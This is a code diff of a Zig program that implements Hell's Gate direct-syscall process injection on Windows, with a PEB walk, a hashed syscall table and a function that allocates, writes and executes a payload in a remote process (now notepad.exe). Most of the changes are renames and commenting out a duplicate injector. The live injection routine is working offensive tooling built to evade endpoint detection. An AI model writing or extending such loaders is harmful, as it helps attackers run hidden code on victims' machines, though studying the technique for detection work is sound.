@@ -4,8 +4,7 @@ const print = std.debug.print;
 const windows = std.os.windows;
 const WINAPI = windows.WINAPI;
 
-// const target_process = "RuntimeBroker.exe";
-const target_process = "taskhostw.exe";
+const target_process = "notepad.exe";
 
 // Windows types and constants
 pub const HANDLE = windows.HANDLE;
@@ -56,8 +55,8 @@ comptime {
         \\    movl %ecx, w_system_call(%rip)
         \\    ret
         \\
-        \\.globl hells_descent
-        \\hells_descent:
+        \\.globl hell_descent
+        \\hell_descent:
         \\    mov %rcx, %r10
         \\    movl w_system_call(%rip), %eax
         \\    syscall
@@ -65,12 +64,12 @@ comptime {
     );
 }
 
-const HellsGateFn = fn (syscall_id: u32) callconv(.C) void;
-const HellDescentFn = fn () callconv(.C) void;
-
 // External function declarations for the global assembly
 pub extern fn hells_gate(syscall_number: DWORD) void;
-pub extern fn hells_descent(arg1: usize, arg2: usize, arg3: usize, arg4: usize, arg5: usize, arg6: usize, arg7: usize, arg8: usize, arg9: usize, arg10: usize, arg11: usize) callconv(.C) NTSTATUS;
+pub extern fn hell_descent(arg1: usize, arg2: usize, arg3: usize, arg4: usize, arg5: usize, arg6: usize, arg7: usize, arg8: usize, arg9: usize, arg10: usize, arg11: usize) callconv(.C) NTSTATUS;
+
+// const HellsGateFn = fn (syscall_id: u32) callconv(.C) void;
+// const HellDescentFn = fn () callconv(.C) void;
 
 // Structures for Hell's Gate
 pub const VxTableEntry = extern struct {
@@ -79,7 +78,7 @@ pub const VxTableEntry = extern struct {
     system_call: WORD,
 };
 
-pub const VX_TABLE = extern struct {
+pub const VxTable = extern struct {
     NtAllocateVirtualMemory: VxTableEntry,
     NtWriteVirtualMemory: VxTableEntry,
     NtProtectVirtualMemory: VxTableEntry,
@@ -369,6 +368,7 @@ fn getRemoteProcessPid(allocator: std.mem.Allocator, process_name: []const u8) !
         }
     }
 
+    std.debug.print("{s}", .{process_name});
     return error.ProcessNotFound;
 }
 
@@ -475,7 +475,7 @@ fn getVxTableEntry(moduleBase: PVOID, exportDir: *ImageExportDirectory, entry: *
 }
 
 // Initialize Hell's Gate VX table
-pub fn init_vx_table() ?VX_TABLE {
+pub fn init_vx_table() ?VxTable {
     const currentTeb = rtlGetThreadEnvironmentBlock();
     const currentPeb = currentTeb.ProcessEnvironmentBlock;
 
@@ -499,7 +499,7 @@ pub fn init_vx_table() ?VX_TABLE {
     };
 
     // Initialize VX table
-    var table = VX_TABLE{
+    var table = VxTable{
         .NtAllocateVirtualMemory = VxTableEntry{
             .addr_ptr = @ptrFromInt(0),
             .hash = NtAllocateVirtualMemory_djb2,
@@ -542,73 +542,73 @@ pub fn init_vx_table() ?VX_TABLE {
 }
 
 // Classic injection using Hell's Gate syscalls
-pub fn hellsGateInject(vx_table: *VX_TABLE, processHandle: HANDLE, payload: [*]const u8, payloadSize: SIZE_T) bool {
-    const success = NTSTATUS.SUCCESS;
-    var status: NTSTATUS = success;
-    var address: ?PVOID = @ptrFromInt(0);
-    var oldProtection: ULONG = 0;
-    var size: SIZE_T = payloadSize;
-    var bytesWritten: SIZE_T = 0;
-    var threadHandle: HANDLE = undefined;
+// pub fn hellsGateInject(vx_table: *VX_TABLE, processHandle: HANDLE, payload: [*]const u8, payloadSize: SIZE_T) bool {
+//     const success = NTSTATUS.SUCCESS;
+//     var status: NTSTATUS = success;
+//     var address: ?PVOID = @ptrFromInt(0);
+//     var oldProtection: ULONG = 0;
+//     var size: SIZE_T = payloadSize;
+//     var bytesWritten: SIZE_T = 0;
+//     var threadHandle: HANDLE = undefined;
+//
+//     print("[*] Starting Hell's Gate injection...\n", .{});
+//
+//     // Step 1: Allocate memory using Hell's Gate
+//     hells_gate(vx_table.NtAllocateVirtualMemory.system_call);
+//     status = hell_descent(@intFromPtr(processHandle), @intFromPtr(&address), 0, @intFromPtr(&size), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0, 0, 0, 0, 0);
+//
+//     if (status != success) {
+//         print("[!] NtAllocateVirtualMemory failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
+//         return false;
+//     }
+//     print("[+] Allocated address at: 0x{X} of size: {d}\n", .{ @intFromPtr(address), size });
+//
+//     // Step 2: Write payload using Hell's Gate
+//     print("[*] Writing payload of size {d}...\n", .{payloadSize});
+//     hells_gate(vx_table.NtWriteVirtualMemory.system_call);
+//     status = hell_descent(@intFromPtr(processHandle), @intFromPtr(address), @intFromPtr(payload), payloadSize, @intFromPtr(&bytesWritten), 0, 0, 0, 0, 0, 0);
+//
+//     if (status != success or bytesWritten != payloadSize) {
+//         print("[!] NtWriteVirtualMemory failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
+//         print("[!] Bytes written: {d} of {d}\n", .{ bytesWritten, payloadSize });
+//         return false;
+//     }
+//     print("[+] Payload written successfully\n", .{});
+//
+//     // Step 3: Change memory protection to executable using Hell's Gate
+//     hells_gate(vx_table.NtProtectVirtualMemory.system_call);
+//     status = hell_descent(@intFromPtr(processHandle), @intFromPtr(&address), @intFromPtr(&payloadSize), PAGE_EXECUTE_READWRITE, @intFromPtr(&oldProtection), 0, 0, 0, 0, 0, 0);
+//
+//     if (status != success) {
+//         print("[!] NtProtectVirtualMemory failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
+//         return false;
+//     }
+//     print("[+] Memory protection changed to executable\n", .{});
+//
+//     // Step 4: Create and execute thread using Hell's Gate
+//     print("[*] Creating thread at entry point 0x{X}...\n", .{@intFromPtr(address)});
+//     hells_gate(vx_table.NtCreateThreadEx.system_call);
+//     status = hell_descent(@intFromPtr(&threadHandle), THREAD_ALL_ACCESS, 0, // NULL object attributes
+//         @intFromPtr(processHandle), @intFromPtr(address), 0, // NULL parameter
+//         0, // Create flags
+//         0, // Stack zero bits
+//         0, // Size of stack commit
+//         0, // Size of stack reserve
+//         0 // Bytes buffer
+//     );
+//
+//     if (status != success) {
+//         print("[!] NtCreateThreadEx failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
+//         return false;
+//     }
+//
+//     print("[+] Thread created successfully with handle: 0x{X}\n", .{@intFromPtr(threadHandle)});
+//     print("[+] Hell's Gate injection completed successfully!\n", .{});
+//
+//     return true;
+// }
 
-    print("[*] Starting Hell's Gate injection...\n", .{});
-
-    // Step 1: Allocate memory using Hell's Gate
-    hells_gate(vx_table.NtAllocateVirtualMemory.system_call);
-    status = hells_descent(@intFromPtr(processHandle), @intFromPtr(&address), 0, @intFromPtr(&size), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0, 0, 0, 0, 0);
-
-    if (status != success) {
-        print("[!] NtAllocateVirtualMemory failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
-        return false;
-    }
-    print("[+] Allocated address at: 0x{X} of size: {d}\n", .{ @intFromPtr(address), size });
-
-    // Step 2: Write payload using Hell's Gate
-    print("[*] Writing payload of size {d}...\n", .{payloadSize});
-    hells_gate(vx_table.NtWriteVirtualMemory.system_call);
-    status = hells_descent(@intFromPtr(processHandle), @intFromPtr(address), @intFromPtr(payload), payloadSize, @intFromPtr(&bytesWritten), 0, 0, 0, 0, 0, 0);
-
-    if (status != success or bytesWritten != payloadSize) {
-        print("[!] NtWriteVirtualMemory failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
-        print("[!] Bytes written: {d} of {d}\n", .{ bytesWritten, payloadSize });
-        return false;
-    }
-    print("[+] Payload written successfully\n", .{});
-
-    // Step 3: Change memory protection to executable using Hell's Gate
-    hells_gate(vx_table.NtProtectVirtualMemory.system_call);
-    status = hells_descent(@intFromPtr(processHandle), @intFromPtr(&address), @intFromPtr(&payloadSize), PAGE_EXECUTE_READWRITE, @intFromPtr(&oldProtection), 0, 0, 0, 0, 0, 0);
-
-    if (status != success) {
-        print("[!] NtProtectVirtualMemory failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
-        return false;
-    }
-    print("[+] Memory protection changed to executable\n", .{});
-
-    // Step 4: Create and execute thread using Hell's Gate
-    print("[*] Creating thread at entry point 0x{X}...\n", .{@intFromPtr(address)});
-    hells_gate(vx_table.NtCreateThreadEx.system_call);
-    status = hells_descent(@intFromPtr(&threadHandle), THREAD_ALL_ACCESS, 0, // NULL object attributes
-        @intFromPtr(processHandle), @intFromPtr(address), 0, // NULL parameter
-        0, // Create flags
-        0, // Stack zero bits
-        0, // Size of stack commit
-        0, // Size of stack reserve
-        0 // Bytes buffer
-    );
-
-    if (status != success) {
-        print("[!] NtCreateThreadEx failed with error: 0x{X:0>8}\n", .{@intFromEnum(status)});
-        return false;
-    }
-
-    print("[+] Thread created successfully with handle: 0x{X}\n", .{@intFromPtr(threadHandle)});
-    print("[+] Hell's Gate injection completed successfully!\n", .{});
-
-    return true;
-}
-
-fn classicInjectionViaSyscalls(vx_table: *VX_TABLE, process_handle: HANDLE, payload: [*]const u8, payload_size: SIZE_T) bool {
+fn classicInjectionViaSyscalls(vx_table: *VxTable, process_handle: HANDLE, payload: [*]const u8, payload_size: SIZE_T) bool {
     const nt_success = NTSTATUS.SUCCESS;
     var status: NTSTATUS = nt_success;
     var address: ?PVOID = @ptrFromInt(0);
@@ -619,7 +619,7 @@ fn classicInjectionViaSyscalls(vx_table: *VX_TABLE, process_handle: HANDLE, payl
 
     // Step 1: Allocate memory using Hell's Gate
     hells_gate(vx_table.NtAllocateVirtualMemory.system_call);
-    status = hells_descent(@intFromPtr(process_handle), @intFromPtr(&address), 0, @intFromPtr(&size), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0, 0, 0, 0, 0);
+    status = hell_descent(@intFromPtr(process_handle), @intFromPtr(&address), 0, @intFromPtr(&size), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0, 0, 0, 0, 0);
 
     if (status != nt_success) {
         print("[!] NtAllocateVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
@@ -630,7 +630,7 @@ fn classicInjectionViaSyscalls(vx_table: *VX_TABLE, process_handle: HANDLE, payl
     // Step 2: Write the payload
     print("\t[i] Writing Payload Of Size {d} ... ", .{payload_size});
     hells_gate(vx_table.NtWriteVirtualMemory.system_call);
-    status = hells_descent(@intFromPtr(process_handle), @intFromPtr(address), @intFromPtr(payload), payload_size, @intFromPtr(&bytes_written), 0, 0, 0, 0, 0, 0);
+    status = hell_descent(@intFromPtr(process_handle), @intFromPtr(address), @intFromPtr(payload), payload_size, @intFromPtr(&bytes_written), 0, 0, 0, 0, 0, 0);
 
     if (status != nt_success or bytes_written != payload_size) {
         print("[!] NtWriteVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
@@ -641,7 +641,7 @@ fn classicInjectionViaSyscalls(vx_table: *VX_TABLE, process_handle: HANDLE, payl
 
     // Step 3: Change memory protection to executable
     hells_gate(vx_table.NtProtectVirtualMemory.system_call);
-    status = hells_descent(@intFromPtr(process_handle), @intFromPtr(&address), @intFromPtr(&payload_size), PAGE_EXECUTE_READWRITE, @intFromPtr(&old_protection), 0, 0, 0, 0, 0, 0);
+    status = hell_descent(@intFromPtr(process_handle), @intFromPtr(&address), @intFromPtr(&payload_size), PAGE_EXECUTE_READWRITE, @intFromPtr(&old_protection), 0, 0, 0, 0, 0, 0);
 
     if (status != nt_success) {
         print("[!] NtProtectVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
@@ -651,7 +651,7 @@ fn classicInjectionViaSyscalls(vx_table: *VX_TABLE, process_handle: HANDLE, payl
     // Step 4: Execute the payload via thread
     print("\t[i] Running Thread Of Entry 0x{X} ... ", .{@intFromPtr(address)});
     hells_gate(vx_table.NtCreateThreadEx.system_call);
-    status = hells_descent(@intFromPtr(&thread_handle), THREAD_ALL_ACCESS, 0, // NULL object attributes
+    status = hell_descent(@intFromPtr(&thread_handle), THREAD_ALL_ACCESS, 0, // NULL object attributes
         @intFromPtr(process_handle), @intFromPtr(address), 0, // NULL parameter
         0, // Create flags
         0, // Stack zero bits
